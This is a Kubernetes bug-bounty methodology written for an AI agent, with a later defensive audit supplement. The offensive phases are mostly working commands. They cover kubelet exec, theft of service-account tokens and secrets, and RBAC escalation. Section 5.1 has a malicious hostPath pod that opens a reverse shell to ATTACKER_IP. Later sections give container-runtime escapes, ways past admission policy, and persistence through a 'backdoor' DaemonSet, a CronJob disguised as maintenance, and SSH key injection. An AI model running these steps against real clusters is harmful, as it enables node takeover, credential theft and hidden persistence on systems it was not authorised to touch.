---
technology: "Kubernetes"
kind: bug-bounty-methodology
audience: ai-agent
family: containers
version: "1.1"
last-refresh: "2026-11-19"
source: "field-mined (5 evidence files, internal coverage ledger) + upstream-verified docs and advisories; audit-methodology supplement (2026-11-19) from kubernetes.io kubelet authn/authz + RBAC + auth-can-i docs, NVD CVE-2018-1002105, Wiz + Sysdig IngressNightmare writeups"
provenance: "Same basis as kubernetes.md: 5-file strict re-gate + kubernetes.io docs (kubelet authn/authz, kube-apiserver flags, API-server bypass risks), cyberark/kubeletctl README, CRI-O CVE-2022-0811 advisory. Pass 1 wave 5, 2026-11-12. Wave 4 HT enrichment 2026-11-13: 5.5 (Helm 2 Tiller, port 44134; PoC chart Ruil1n/helm-tiller-pwn verified to exist upstream, RBAC gating carried from its own advisory framing) and 5.6 (node-local runtime sockets: nerdctl/ctr/crictl) rewritten from HackTricks (src/network-services-pentesting/44134-pentesting-tiller-helm.md and src/linux-hardening/containers-namespaces/container-security/runtime-api-and-daemon-exposure.md), CC BY-NC 4.0, accessed 2026-11-13. Pentest-book supplement 2026-11-13: source: six2dez/pentest-book (enumeration/cloud/k8s-admission-bypass.md and enumeration/cloud/docker-and-and-kubernetes.md, no license — rewritten with attribution), accessed 2026-11-13; adds 4.1 RBAC escalation verbs, 5.5 Helm 3 values, 5.7 admission-control bypass and 5.8 persistence (verified against kubernetes.io admission-controller, Pod Security Admission, and static-pod docs; CVE-2018-1002105 verified against Ubuntu's CVE tracker), tool-map additions. Attack-surface audit supplement 2026-11-19 (Phase 10 + CIS/reporting blocks): detection-evidence-reporting framing for misconfiguration classes, kubelet read-only probes, anonymous-auth detection, in-pod ServiceAccount self-audit mapped to CIS Kubernetes Benchmark, etcd client-cert probe, dashboard class, RBAC escalation-primitive review, imagePullSecrets exposure; sources kubernetes.io (kubelet authentication-authorization, RBAC, authorization/checking-api-access), NVD CVE-2018-1002105, Wiz + Sysdig IngressNightmare (CVE-2025-1974) writeups. Model claude-opus-4-8."
---

# Kubernetes — bug-bounty methodology

Companion overview: [[kubernetes]] (control-plane anatomy, defaults that leak). Audience: an agent executing a hunt. Field-grounded steps name their chain; version claims are upstream-verified. Targets below are `198.51.100.x` placeholders; cluster-internal ranges use pattern forms (`172.17.0.x`, `10.43.0.x`) where the RANGE FACT matters.

## 0. Fingerprint signatures

| Probe / observation | Meaning |
|---|---|
| `curl -k https://198.51.100.x:6443/version` returns JSON | Kubernetes API server, anonymous requests not blocked at authn |
| 8443 answering `Client sent an HTTP request to an HTTPS server` (HTTP) / k8s JSON (HTTPS) | Single-node distribution (minikube/k3s) API server (both observed) |
| 10250 `curl -k .../pods` → pod list JSON | Kubelet with anonymous access + permissive authz — phase 2 (observed) |
| 10250 → 401/403 | Kubelet hardened or webhook authz — try token from any pod you hold |
| 2379/2380 open (`etcd-client`/`etcd-server` in nmap) | Cluster state + secrets: pivot to [[etcd]] (observed) |
| nmap 10255 open | Legacy read-only kubelet port (no authn at all; disabled in modern defaults) |
| In a shell: `/run/secrets/kubernetes.io/serviceaccount/` exists; env `KUBERNETES_SERVICE_HOST` | You are in a pod — phase 3 |

## 1. Recon: ports and the anonymous surface

```bash
nmap -p- -sV 198.51.100.x        # 6443/8443, 10250, 2379/2380, 10255, NodePort 30000-32767
curl -sk https://198.51.100.x:6443/version          # version even when RBAC denies the rest
curl -sk https://198.51.100.x:8443/api              # API groups list
curl -sk https://198.51.100.x:10250/pods            # kubelet — see phase 2
```

Upstream facts to reason with: the API server's `--anonymous-auth` defaults **true** (requests that fail other authenticators become `system:anonymous` in group `system:unauthenticated`; secure port defaults 6443); the kubelet's `--anonymous-auth` also defaults **true** and its `--authorization-mode` defaults `AlwaysAllow`. Most managed distributions harden these — lab/single-node boxes frequently don't. Note that the observed deployments' ports vary: minikube-style clusters put the API on 8443; k3s-style put it behind 443 with a service CIDR like 10.43.0.x (an observed `KUBERNETES_SERVICE_HOST`).

## 2. Kubelet 10250 — enumerate, then execute

The kubelet bypasses the API server entirely (and its audit log). Direct endpoints: `/pods` (desired state), `/runningPods/` (runtime view), `/configz`, `/healthz`, `/stats/*`; execution over `/run/<ns>/<pod>/<container>` (POST `cmd=`) and websocket `/exec/<ns>/<pod>/<container>?command=...&output=1&error=1` with subprotocol `v4.channel.k8s.io`. Per upstream docs, RBAC `get` on `nodes/proxy` covers ALL of these — "read-only" it is not.

```bash
curl -k https://198.51.100.x:10250/pods            # full pod list incl. namespaces (observed)
```

**kubeletctl** (CyberArk's kubelet client) wraps the whole arc — install from its GitHub releases:

```bash
kubeletctl --server 198.51.100.x pods              # pretty pod/container table (observed)
kubeletctl --server 198.51.100.x scan rce          # probes every container for /run RCE, prints +/- table
kubeletctl --server 198.51.100.x exec "id" -p nginx -c nginx          # command in a pod's container
kubeletctl --server 198.51.100.x exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p <pod> -c <ctr>
kubeletctl scan rce --cidr 198.51.100.0/24         # whole-subnet sweep
```

`scan rce` output rows marked `+` are executable containers (observed: `nginx +`, `etcd -`). Interpret `-` with care — the check probes `/run`, and a container can allow `/exec` while failing the `/run` probe; hand-verify with `exec`. With any bearer token (phase 3) add `Authorization: Bearer TOK — the same endpoints authorize via SubjectAccessReview in webhook mode (/exec was driven this way in the field).

Token theft via exec (observed): pull `token` AND `ca.crt` out of the target pod, then switch to phase 4 tooling against the API server.

## 3. In-pod: the service account you already own

From any shell inside a pod (the official in-cluster access recipe, used repeatedly in the field):

```bash
ls /run/secrets/kubernetes.io/                    # or /var/run/... — same mount
env | grep KUBERNETES                             # KUBERNETES_SERVICE_HOST=<service IP>
APISERVER=https://kubernetes.default.svc           # in-cluster DNS name for the API server
NAMESPACE=$(cat /run/secrets/kubernetes.io/serviceaccount/namespace)
TOKEN=$(cat /run/secrets/kubernetes.io/serviceaccount/token)
CACERT=/run/secrets/kubernetes.io/serviceaccount/ca.crt
curl --cacert $CACERT -H "Authorization: Bearer $TOKEN" $APISERVER/api       # sanity check
```

Raw secrets enumeration with zero tooling (works with curl alone inside stripped pods):

```bash
curl -sSk -H "Authorization: Bearer $TOKEN" \
  "$APISERVER/api/v1/namespaces/$NAMESPACE/secrets"          # observed twice
curl -sSk -H "Authorization: Bearer $TOKEN" \
  "$APISERVER/api/v1/namespaces/$NAMESPACE/configmaps"       # same shape: config-as-secrets
```

`data:` fields are base64 — decode every value (`echo -n <v> | base64 -d`). Observed yield: MariaDB root passwords, helm release payloads, per-user secrets; an APISIX admin key that unlocked the next service; a `c-admin` cluster-admin token. A 403 with `system:serviceaccount:default:default cannot list resource "secrets"` is not a dead end — it is a precise statement of who you are; go map that identity (phase 4).

## 4. RBAC mapping and the namespace walk

With kubectl (copy token + ca.crt out; use the IP, not hostname, so ca.crt validation matches — observed):

```bash
kubectl --token=$TOKEN --certificate-authority=ca.crt --server=https://198.51.100.x:8443 auth can-i --list
kubectl ... auth can-i --list -n dev                # per-namespace view
kubectl ... auth can-i create pods --all-namespaces
kubectl ... get namespaces                          # where can you go?
kubectl ... get pods -n dev && kubectl ... describe pod <pod> -n dev    # pod IPs for pivots
```

Without kubectl, the same map over raw curl — SelfSubjectRulesReview (observed):

```bash
curl -sk -X POST "$API/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview",
       "spec":{"namespace":"default"}}'
```

Read the verbs table the way the observed chains did: `namespaces [get list]` → enumerate them; `pods [get list]` in `dev` → new target pods (pivot to their IPs — pod-to-pod is allowed by default); `secrets [get list]` in `kube-system` → steal the cluster-admin's secret and replay its token. `*.* [*]` means cluster-admin: stop enumerating, start phase 5. The nodes/proxy subresource is the other jackpot — it is exec-in-any-pod on that node (observed).

**4.1 The verbs that mean escalation, not just access** (supplement 2026-11-13, six2dez/pentest-book rewritten):

- **`impersonate`** (user/group/serviceaccount verbs, often via `--as`) — `kubectl auth can-i --list --as=system:admin` style probes: if your identity may act as another principal, every RBAC wall on that principal falls. Treat any impersonate verb as cluster-admin-equivalent.
- **`create` on `rolebindings`/`clusterrolebindings`** — bind an existing cluster-admin ClusterRole to yourself: `kubectl create rolebinding pwn --clusterrole=admin --user=<you> -n default`.
- **`create pods` in ANY namespace** — beyond 5.1's hostPath pod, a quieter variant binds a more privileged *service account*: set `serviceAccountName: <admin-sa>` on the pod spec and read that account's token from the running pod (`/run/secrets/kubernetes.io/serviceaccount/token`), then replay it against the API.
- **Dump-everything loop** — once verbs allow, snapshot every resource cluster-wide in one pass and grep offline: `for r in $(kubectl api-resources -o name); do kubectl get "$r" -A -o yaml > "$r".yaml; done`.

Also check the human path: `~/.kube/config` of another user (group-readable home dirs) is a working kubeconfig — `kubectl --kubeconfig /home/<user>/.kube/config get pods`; `~/.minikube/profiles/*/config.json` names the runtime (CRI-O, observed) and cluster details.

## 5. Escalation: from verbs to the node

**5.1 Malicious pod with hostPath** (both observed) — the Kubernetes form of "mount the host":

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: nginxt
  namespace: default              # anywhere you can create pods
spec:
  containers:
  - name: nginxt
    image: nginx:1.14.2           # or an image already on the node (see below)
    imagePullPolicy: Never        # air-gapped clusters: reuse the local image
    command: ["/bin/sh"]
    args: ["-c", "nc ATTACKER_IP 4444 -e /bin/sh"]   # or a long-lived shell
    volumeMounts:
    - mountPath: /root
      name: mnt
  volumes:
  - name: mnt
    hostPath:
      path: /                     # the node's root
  hostNetwork: true
```

Air-gap handling (observed): `kubectl get pod <existing> -o yaml` reveals the image every node already pulls (e.g. `localhost:5000/node_server` from an in-cluster registry) — reuse it with `imagePullPolicy: Never`. Apply with `kubectl ... apply -f f.yaml`, confirm `get pods`, then read flags via the mounted node root (`/root/root/root.txt` through kubelet exec, observed).

**5.2 nodes/proxy → exec anywhere** (observed): with `get nodes/proxy`, POST to a SelfSubjectRulesReview first confirmed it, then speak the kubelet exec websocket yourself (`wss://node:10250/exec/<ns>/<pod>/<container>?...&command=<cmd>`, subprotocol `v4.channel.k8s.io`, Bearer token) — a short Python websockets script is enough; target a pod that is `privileged` AND mounts hostPath `/` (find one by parsing `/pods` JSON for `securityContext.privileged` + hostPath volumes) so "any command" means "on the node".

**5.3 Runtime CVE — CRI-O cr8escape (CVE-2022-0811)**: CRI-O >= 1.19 before 1.19.6/1.20.7/1.21.6/1.22.3/1.23.2 (fixed line includes 1.24.0) accepts `+`-delimited sysctl values in pod specs, letting pod authors set arbitrary kernel parameters — `kernel.core_pattern` piped to a script on the node = root on the node (observed, against minikube 1.28.0's bundled CRI-O). Pod-create rights in ANY namespace you can reach (observed: `development`, found by trial after `create` was denied in `default`) are enough; the core_pattern path points into the node's overlay (`/var/lib/containers/storage/overlay/<id>/diff/...` for CRI-O hosts).

**5.4 etcd 2379**: if nodes expose it to you, the cluster's state — including every Secret — is one key-prefix away; the full workflow lives in [[etcd]] (an observed etcd pod sighting is the cross-reference point).

**5.5 Legacy: Helm 2 Tiller on 44134.** Helm 2 ran an in-cluster server (Tiller) that applied charts with its own service account; Helm 3 deleted the component, so 44134 open (or a `tiller-deploy` pod/service in `kube-system`) marks a legacy estate:

```bash
kubectl get pods,services -A | grep -i tiller     # -n kube-system is the classic home
nmap -p 44134 198.51.100.x                        # or straight to the port
helm2 --host tiller-deploy.kube-system:44134 version   # needs a Helm 2 client; Helm 3 speaks no Tiller
```

Tiller commonly deployed without TLS or authentication — anyone who reaches the port can install a chart, and the chart's manifests are applied with TILLER's RBAC rights. The public proof-of-concept chart (Ruil1n/helm-tiller-pwn) binds broad cluster roles to the `default` service account — but read it as gated, not magic: it lands only where Tiller's own account may create RBAC objects. Inspect the chart's clusterrole/clusterrolebinding manifests before firing, and prefer a chart that demonstrates the permission (a pod listing) over one that grants it. Kubelet-style anonymous RCE this is not — the impact ceiling is exactly Tiller's service account. Helm 3 follow-up (supplement 2026-11-13): with client rights only, `helm list -A` → `helm get values <release> --all` and `helm get manifest <release>` frequently dump chart-supplied secrets (DB passwords, API keys) that nobody treats as cluster secrets — a read-only finding worth one command.

**5.6 On the node: runtime sockets are the docker-equivalent primitive.** Once phase 5.1/5.2 lands you a shell on a node, the container runtime's own socket is the same host-root lever the docker socket is on Docker hosts:

```bash
find /run /var/run -maxdepth 3 \( -name containerd.sock -o -name crio.sock -o -name kubelet.sock -o -name podman.sock \) 2>/dev/null
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io run --rm -it \
  --privileged --pid=host -v /:/host docker.io/library/alpine:latest sh   # then chroot /host
crictl --runtime-endpoint unix:///run/containerd/containerd.sock ps       # node-local container map (CRI)
ctr --address /run/containerd/containerd.sock images ls                   # low-level containerd client
```

Kubernetes nodes keep their containers in containerd's `k8s.io` namespace — `nerdctl`'s docker-like flags make the escape one command; `crictl` speaks either CRI endpoint (containerd or CRI-O) for reconnaissance even when creation is locked down. The kubelet's own loopback surface on the node is phase 2's material — `curl -sk https://127.0.0.1:10250/pods` with the node's service-account token if present costs one request.

**5.7 Admission-control bypass** (supplement 2026-11-13, six2dez/pentest-book `k8s-admission-bypass.md` rewritten; semantics verified against kubernetes.io's admission-controller, Pod Security Admission, and static-pod pages). Admission runs AFTER authn/authz, on every create/update/delete (reads bypass it entirely — kubernetes.io states this explicitly). Policy engines here — ValidatingAdmissionWebhook plus OPA Gatekeeper, Kyverno, and the built-in PodSecurity — are a second RBAC, and they fail in their own ways:

*Enumerate the layer first:*

```bash
kubectl get validatingwebhookconfigurations -o yaml   # every webhook, its failurePolicy, namespaceSelector
kubectl get mutatingwebhookconfigurations -o yaml
kubectl get constraints,constrainttemplates            # Gatekeeper policy + its Rego source
kubectl get clusterpolicies,policies -A                # Kyverno rules
```

*Then hunt these gap classes:*

- **Fail-open webhooks (`failurePolicy: Ignore`).** If the webhook errors, times out, or is unreachable, the request is ADMITTED. Ways to force that state with modest rights: scale the webhook deployment to zero (`kubectl scale deployment gatekeeper-controller-manager -n gatekeeper-system --replicas=0`), or drop an ingress-deny NetworkPolicy over the webhook pods — then create the pod the policy would have blocked. A ~30s default webhook timeout means bloated payloads (a ConfigMap with megabytes of data, hundreds of annotations) can also walk a request past a slow validator.
- **Excluded namespaces.** `namespaceSelector` gaps — frequently `kube-system`, the policy engine's own namespace, `cert-manager` — mean a privileged pod created THERE never meets the webhook at all. Enumerate the selector before assuming a deny means deny-everywhere.
- **Label exemptions.** Gatekeeper/Kyverno constraints often exempt objects carrying a specific label (a common ops pattern). Read the constraint template's Rego/YAML for the exemption key and stamp it on your pod.
- **Policy logic holes.** Rego that checks `containers[_]` but not `initContainers`/`ephemeralContainers` — put the malicious image where the loop doesn't look. Image policies that `split(image, ":")` are blind to tag-less images (`nginx` defaults to latest) and digest refs (`nginx@sha256:…`).
- **Ephemeral containers** (`kubectl debug -it <pod> --image=busybox --target=<container>`): a legitimate feature for debugging that many policies simply never modeled — if admitted, you are sharing the target pod's namespaces; from a node-debug session (`kubectl debug node/<node>`) you land on the node itself.
- **Static pods — full bypass by design.** The kubelet reads manifests straight from its `staticPodPath` (classically `/etc/kubernetes/manifests/`) and runs them with no API-server round trip, hence no admission at all — requires node access (5.6), at which point a privileged hostPath pod in the manifest dir is game over anyway. The API server only ever sees the mirror pod.
- **Pod Security Admission label flip.** PSS enforces per-namespace labels `pod-security.kubernetes.io/<enforce|audit|warn>: <privileged|baseline|restricted>`. Write access to a namespace object (`kubectl label ns target pod-security.kubernetes.io/enforce=privileged --overwrite`) dissolves the whole standard for that namespace in one verb. Two gate the other way (kubernetes.io): enforce applies to pod objects only, NOT to workload resources (controllers re-check at pod creation); and pod spec updates are immutable beyond metadata/`activeDeadlineSeconds`/`tolerations` — so "create compliant then patch the pod privileged" TOCTOU ideas fail at the API server, not at admission. The real update-gap lives in controllers that reconcile children admission never sees.
- **Webhook config tampering.** With RBAC on `validatingwebhookconfigurations` themselves, edit the target: flip `failurePolicy: Fail` to `Ignore`, or add your namespace to the exclusion selector. Also decode the `caBundle` (`base64 -d | openssl x509 -text`): an expired/mismatched cert plus `Ignore` means that webhook has been silently dead for months.
- Gatekeeper specifics: referential constraints depend on the sync config (`config.config.gatekeeper.sh`) — an un-synced object type makes those constraints evaluate against stale or empty data. Kyverno specifics: `generate` rules stamp ownerReferences on produced resources — strip the ownerRef and the object is orphaned from policy management; and background scans report on pre-existing resources but never blocked them at creation.

**5.8 Persistence once verbs exist** (same supplement): a DaemonSet runs your image on EVERY node (`kubectl create daemonset backdoor --image=<attacker-image>`); a CronJob re-fires on a schedule (`schedule: "*/5 * * * *"` in a batch/v1 manifest named to look like maintenance); a mutating admission webhook you own sees every future pod spec — full-cluster control and a tripwire in one; and from any privileged hostPath pod, `echo '<ssh-key>' >> /host/root/.ssh/authorized_keys` persists at the node layer where cluster tooling rarely looks. Historically, CVE-2018-1002105 (fixed in 1.10.11/1.11.5/1.12.3) let a crafted proxied-upgrade request through the API server speak to backends with the API server's own credentials — an era marker for why api-server proxy verbs are sensitive, not a live default path.

## 6. Pivots and exfil patterns

- **Port-forwarding out**: `kubectl ... port-forward pod/<pod> <local>:<pod-port>` or `kubectl ... port-forward svc/<svc> ...` once you hold a kubeconfig/token; without kubectl, chisel from the pod works as on any Linux box.
- **Pod-to-pod pivots** are default-allow: `describe pod` gives pod IPs (172.17.0.x etc.), reachable from any compromised pod — re-exploit the same app on the sibling's IP (one observed chain went default→dev namespaces this way).
- **Secrets → next service**: treat every decoded Secret as a credential list for OTHER attack surfaces (an observed APISIX admin key → CVE-2022-24112 in the next tier; observed DB passwords → the database units).
- **Service DNS**: in-cluster names resolve (`kubernetes.default.svc`, `apisix-admin`, `<svc>.<ns>.svc.cluster.local`) — use them from pods instead of IPs where the target validates Host headers.

## 7. Decision points

1. 6443/8443 anonymous → enumerate `/version`, `/api`; only RBAC gates further — try phase 3/4 as `system:anonymous`.
2. 10250 anonymous `/pods` → kubeletctl `scan rce` → exec → steal the pod's SA token → phase 4 (the observed arc; no web exploit needed).
3. Shell in a pod → read token/namespace → `can-i --list` (or SelfSubjectRulesReview) → walk namespaces for wider verbs → secrets steal or pod create.
4. `create pods` anywhere → hostPath `/` pod → node root (declare the image strategy for air-gapped clusters).
5. `get nodes/proxy` → websocket exec into a privileged hostPath pod → node root.
6. CRI-O runtime and pod-create rights → cr8escape core_pattern → node root.

## 8. Command quick reference

```bash
# anonymous recon
curl -k https://198.51.100.x:6443/version ; curl -k https://198.51.100.x:10250/pods
# kubelet execution
kubeletctl --server 198.51.100.x pods ; kubeletctl --server 198.51.100.x scan rce
kubeletctl --server 198.51.100.x exec "id" -p <pod> -c <container>
# in-pod client
TOKEN=$(cat /run/secrets/kubernetes.io/serviceaccount/token) ; NS=$(cat .../namespace)
curl -sSk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api/v1/namespaces/$NS/secrets
# RBAC map
kubectl --token=$TOKEN --certificate-authority=ca.crt --server=https://198.51.100.x:8443 auth can-i --list
# node takeover (create-pod right): hostPath / + privileged/hostNetwork pod, imagePullPolicy Never
```

## 9. Tool map (prose)

kubectl is the API workhorse (`--token`, `--certificate-authority`, `--kubeconfig`, `auth can-i`, `port-forward`); kubeletctl is the kubelet specialist (pods, scan rce, exec, token grabbing); plain curl covers both APIs when binaries are scarce, with the in-cluster DNS name and mounted ca.crt; a few lines of Python (websockets library) drive the kubelet exec channel directly (observed); openssl inspects/validates the cluster CA; base64 decodes Secret payloads; chisel forwards unreachable service networks out. Suite additions (supplement 2026-11-13): peirates automates the in-cluster attack arc from a stolen service-account token; kube-hunter probes a cluster remotely or in-pod for known misconfigurations; kubeaudit and kube-bench audit configurations against CIS benchmarks — recon ammunition and defense-side validation in one. Cross-vault: per-tool reference notes live in the tools vault; the docker-side equivalents of the daemon chains (runc, registry, image abuse) live in [[docker-bug-bounty|the docker methodology]]; etcd-specific work lives in [[etcd]].

---

## Supplement — attack-surface audit methodology (added 2026-11-19)

*Source: kubernetes.io docs (kubelet authentication/authorization — https://kubernetes.io/docs/reference/command/kubelet-authentication-authorization/; RBAC — https://kubernetes.io/docs/reference/access-authn-authz/rbac/; checking API access — https://kubernetes.io/docs/reference/access-authn-authz/authorization/#checking-api-access), NVD CVE-2018-1002105 (https://nvd.nist.gov/vuln/detail/CVE-2018-1002105), and the IngressNightmare writeups from Wiz (https://wiz.io/blog/ingress-nginx-kubernetes-vulnerabilities) and Sysdig (https://sysdig.com/blog/detecting-and-mitigating-ingressnightmare-cve-2025-1974). Extends the offense-first phases above with a detection→evidence→report arc for authorized audit engagements, where the deliverable is a findings report mapped to the CIS Kubernetes Benchmark, not a node shell. Every probe below is single-request, read-only, and non-destructive; exploitation is referenced only to argue severity.*

The phases above are the **exploitation** arc — you hold a token, you walk to the node. This supplement is the **audit** arc you run first when the engagement's product is a report: the posture is *the misconfiguration is the finding; the attack path is the severity argument.* On a bounty program a read-only kubelet port is already reportable the instant it answers; you do not need to pop a node to prove the class exists. Exploit only as far as the program's rules and your evidence budget require, then stop and write it down.

### 10.0 The audit posture — what "the finding" is before you exploit

For each class: one read-only probe, what a positive looks like, the attack path that sets severity, and the CIS control it violates.

| Misconfiguration class | Read-only probe | Positive = finding | Severity comes from | CIS control family |
|---|---|---|---|---|
| Kubelet read-only / anon API | `GET :10255/pods`, `GET :10250/pods` | any `200` with pod JSON | exec→token theft→API (§2) | Kubelet args (`--anonymous-auth`, `--authorization-mode`) |
| API server anonymous auth | `GET :6443/api` unauthenticated | API groups / resource lists return | `system:anonymous` can list/escalate | API server (`--anonymous-auth=false`) |
| Over-permissioned ServiceAccount | in-pod `auth can-i --list` | `secrets [get]`, `pods/exec [create]`, `*` | token→cluster-admin (§4.1) | RBAC & SA policies |
| etcd client exposure | `GET :2379/version` without client cert | answers without mTLS | every Secret is one key-prefix away (§5.4) | etcd (`--client-cert-auth=true`) |
| Dashboard unauth | `GET /` on the dashboard service | UI loads, Skip permitted | dashboard SA rights = your rights | General policies |
| imagePullSecrets exposure | read SA / pod spec `imagePullSecrets` | dockerconfigjson readable | registry creds → supply-chain pivot | Secret management |

Run 10.1–10.6 in that order; 10.7 (CVE anchors) and 10.8 (reporting) turn the positives into a report.

### 10.1 Kubelet 10250/10255 — read-only probes first, exec is lab-verification only

The audit sequence inverts phase 2: **probe the harmless GETs, and stop the moment one answers.** Per the kubelet authentication/authorization docs, a request to the kubelet HTTPS endpoint that is not rejected by an authenticator is treated as anonymous (`system:anonymous`, group `system:unauthenticated`), and when `--authorization-mode=AlwaysAllow` that anonymous request is also authorized. The GET endpoints below need no token and change nothing:

```bash
curl -sk -o /dev/null -w '%{http_code}\n' https://198.51.100.x:10250/healthz   # liveness probe first — cheapest, proves the port speaks kubelet
curl -sk https://198.51.100.x:10250/pods        | head -c 400                   # desired-state pod list (names/namespaces)
curl -sk https://198.51.100.x:10250/runningpods/ | head -c 400                  # runtime view — a 200 here is itself the finding
curl -sk -o /dev/null -w '%{http_code}\n' http://198.51.100.x:10255/pods        # legacy read-only port: no authn at all if open
```

Decision point: **a `200` from `/runningpods/` (or anything on 10255) is a complete finding on its own** — anonymous read access to the kubelet's runtime inventory, no further action required. `/pods` and `/runningpods/` leak namespaces, pod names, container names, images, and `securityContext` — enough to write "unauthenticated enumeration of all workloads on node 198.51.100.x" with the response body as evidence.

The exec/run endpoints (`/run/*`, `/exec/*` — §2) are a different severity tier and a different authorization check: the kubelet docs map all of these, GETs included, to RBAC `get` on the `nodes/proxy` subresource, so a cluster that authorizes anonymous `/pods` very often authorizes anonymous exec too. **In audit mode treat exec strictly as lab-verification:** demonstrate it once, against a single benign command (`id`) in one container, only when the program explicitly permits active exploitation and you need the severity bump from read-only→RCE. Capture that one transcript and stop — do not `scan rce` a subnet, do not read other tenants' tokens, do not iterate containers. The read-only finding stands whether or not you fire exec.

Evidence to capture: the `curl -w '%{http_code}'` line for each endpoint, the first ~400 bytes of one `/pods` body (redact any value that looks like a secret), and the exact URL. That trio is the whole PoC.

### 10.2 Anonymous-auth API detection — what `system:anonymous` can list

The API server's `--anonymous-auth` defaults true; the audit question is not "is it true" but "what does the anonymous identity actually reach." `/version` answering (phase 0) only proves the port is open — probe what the anonymous subject is *authorized* for:

```bash
curl -sk -o /dev/null -w '%{http_code}\n' https://198.51.100.x:6443/api        # API groups — baseline
curl -sk https://198.51.100.x:6443/api/v1/namespaces                           # anonymous namespace list?
curl -sk https://198.51.100.x:6443/api/v1/namespaces/default/secrets           # the jackpot probe — anonymous secret read
```

Then ask the server directly who it thinks you are and what you may do, using the checking-API-access mechanism (SelfSubjectAccessReview) with no credential attached:

```bash
curl -sk -X POST https://198.51.100.x:6443/apis/authorization.k8s.io/v1/selfsubjectaccessreviews \
  -H 'Content-Type: application/json' \
  -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectAccessReview",
       "spec":{"resourceAttributes":{"verb":"list","resource":"secrets"}}}'
# "allowed": true  as system:anonymous  -> Critical
```

Interpretation: a `403` with `User "system:anonymous" cannot list resource "..."` is the *secure* behavior and a precise statement that anonymous authz is scoped — note it and move on. A `200`/`"allowed":true` is the finding, and severity tracks exactly what the verb+resource unlocks: anonymous `list secrets` is Critical; anonymous `list pods` is High (recon + the §4 pivot surface); anonymous `get /version` alone is Info. CIS framing: this maps to the API-server anonymous-auth control; the fix is `--anonymous-auth=false` (or an authenticating proxy), and the report should say so.

### 10.3 In-pod ServiceAccount self-audit — token, can-i, and the CIS mapping

When the program gives you an authorized test pod, the highest-signal, lowest-noise audit you can run is the service account's own rights — no scanning, no lateral movement, just "what was this pod handed." The projected token lives at the standard mount (confirm the path before trusting it — it is stable but worth one `ls`):

```bash
ls -l /var/run/secrets/kubernetes.io/serviceaccount/           # token, ca.crt, namespace (projected SA token)
cat   /var/run/secrets/kubernetes.io/serviceaccount/namespace
```

The one command that produces the whole finding is the authorization self-list from the checking-API-access docs:

```bash
kubectl auth can-i --list                                      # every verb/resource this SA holds, in its namespace
kubectl auth can-i --list --namespace kube-system              # repeat for sensitive namespaces you can reach
kubectl auth can-i create pods/exec                            # the specific escalation verbs, one at a time
kubectl auth can-i get secrets
kubectl auth can-i '*' '*'                                     # cluster-admin test — "yes" = stop, you found it
```

Read the `auth can-i --list` table against the CIS Kubernetes Benchmark's RBAC/ServiceAccount controls — the report lands harder when each line cites a control:

| `can-i --list` shows | Attack path (severity argument) | CIS control theme |
|---|---|---|
| `secrets [get list]` | read every credential in scope → §6 pivot to other services | Minimize access to secrets |
| `pods/exec [create]` | shell into any pod in the namespace → token theft | Minimize access to `create pods` / exec |
| `pods [create]` | §5.1 hostPath pod → node root | Minimize `create pods`; avoid privileged/hostPath |
| `rolebindings`/`clusterrolebindings [create]`, verb `bind`/`escalate` | §4.1 self-grant cluster-admin | Minimize wildcard & binding rights |
| `*` on `*` | cluster-admin already | No wildcard roles bound to workloads |
| default SA auto-mounted at all | ambient token present to any RCE in the pod | Default SA should not be auto-mounted |

The audit-mode subtlety: a *scoped* SA (only `get` on its own configmaps, say) is the secure finding — write "ServiceAccount `default:default` holds only namespaced read access; no escalation primitive observed," which is a real, defensible coverage statement. The auto-mount itself is a hardening note even when the rights are thin, because it hands an ambient token to any future code-execution bug in the pod.

**imagePullSecrets exposure** belongs in this self-audit. If the SA (or a pod spec) references an `imagePullSecrets` entry and you can read it, its `.dockerconfigjson` is base64 inside the Secret:

```bash
kubectl get serviceaccount default -o jsonpath='{.imagePullSecrets[*].name}'
kubectl get secret <name> -o jsonpath='{.data.\.dockerconfigjson}' | base64 -d     # registry host + auth token
```

Impact to argue: registry credentials are read-write often enough that the finding is not "an attacker can pull images" but "an attacker can **push** a backdoored image to the tag this cluster deploys" — a supply-chain pivot whose blast radius is every workload that pulls that repo. That reframing is usually the difference between a Medium and a High. Evidence: the Secret name and that the value decodes to a registry credential — never paste the decoded credential into the report; cite its shape and that it decoded.

### 10.4 etcd 2379 — client-cert probe without reading data

etcd holds every Secret and the whole cluster state; the audit must prove the exposure *without reading a single key*. The non-destructive probe is "does the client endpoint require mutual TLS, or will it talk to an un-certified client," using only curl against the metadata/health surface:

```bash
curl -sk -o /dev/null -w '%{http_code}\n' https://198.51.100.x:2379/version     # answers without --cert/--key = no client-cert auth
curl -sk https://198.51.100.x:2379/health                                        # health, not data
# contrast: a hardened node refuses the TLS handshake / returns a cert-required error for the same request
```

A `200` from `/version` or `/health` with **no client certificate presented** is the finding: etcd is not enforcing client-certificate authentication (`--client-cert-auth` / peer-auth disabled), so any party reaching 2379 is one `range` request away from every Secret in the cluster. You do **not** issue that range request in audit mode — the severity argument is the architecture (unauthenticated access to the secret store), and dumping keys adds risk and data-handling burden without strengthening the report. Capture the status line and the absence of a presented cert; cite the full-exfil path to [[etcd]] for the exploitation detail. CIS theme: the etcd client/peer cert-auth controls.

### 10.5 Dashboard unauthenticated-access class

The Kubernetes Dashboard is a recurring unauth class because older/ misconfigured deployments allow "Skip" at the login screen, binding the browser session to the dashboard's own ServiceAccount — whatever that SA can do, an anonymous visitor can do. Detect the service and whether it serves a usable UI without credentials:

```bash
curl -sk -o /dev/null -w '%{http_code}\n' https://198.51.100.x:<nodeport>/        # dashboard via NodePort/ingress
# or, holding a kubeconfig, surface it locally without touching the node:
kubectl get svc -A | grep -i dashboard
kubectl port-forward -n kubernetes-dashboard svc/kubernetes-dashboard 8443:443
```

Positive = the dashboard renders and a "Skip" path reaches cluster resources. Severity is exactly the dashboard SA's rights — a dashboard bound to a broad role is a graphical cluster-admin for anyone who can reach the port; run the §10.3 `auth can-i --list` as that SA (via its token) to quantify it. The finding writes itself: "unauthenticated Kubernetes Dashboard at 198.51.100.x grants `<verbs>` as `<sa>`." Evidence: the landing-page screenshot/status and the SA's `can-i --list`.

